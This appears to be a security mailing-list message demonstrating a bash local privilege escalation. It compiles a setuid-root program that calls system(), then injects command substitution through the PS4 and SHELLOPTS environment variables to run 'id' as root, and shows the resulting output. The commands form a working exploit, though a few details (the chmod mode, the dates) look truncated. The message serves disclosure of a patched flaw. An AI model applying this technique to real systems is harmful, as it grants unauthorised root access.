"nn. Shells running as root no longer inherit PS4 from the environment, closing a security hole involving PS4 expansion performing command substitution."  # gcc -xc - -otest <<< 'int main() { setuid(0); system("/bin/date"); }' # chmod ./test # ls -l ./test -rwsr-xr-x. 1 root root Sep 10 ./test # exit $ env -i SHELLOPTS=xtrace PS4='$(id)' ./test uid=0(root) Sat Sep 10 WET  Sorry Tavis :P  ---------------------------------------------------------------- This message was sent using IMP, the Internet Messaging Program.
